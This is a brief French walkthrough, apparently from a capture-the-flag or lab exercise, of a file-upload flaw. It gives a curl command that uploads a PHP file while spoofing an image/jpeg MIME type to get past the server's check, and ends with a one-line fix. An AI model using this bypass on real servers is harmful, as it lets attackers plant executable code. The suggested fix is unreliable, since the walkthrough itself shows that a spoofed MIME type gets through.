Faille numero 12 : Upload fichier php
  • retour

Upload fichier php a la place d'une image

Exploitation de la faille :

Etape 1 :

On creer un fichier php vide ou avec des lignes de code

Etape 2 :

On execute la commande curl suivante :
curl -s -X POST -F "uploaded=@chemin vers votre fichier php;type=image/jpeg" -F "Upload=Upload" "http://192.168.1.38/index.php?page=upload" | grep -e 'flag'
le image/jpeg est tres important car il permet de faire croire au serveur que le mime du fichier et celui d'une image

Protection de la faille :

utiliser un htacess pour verifier les mimes
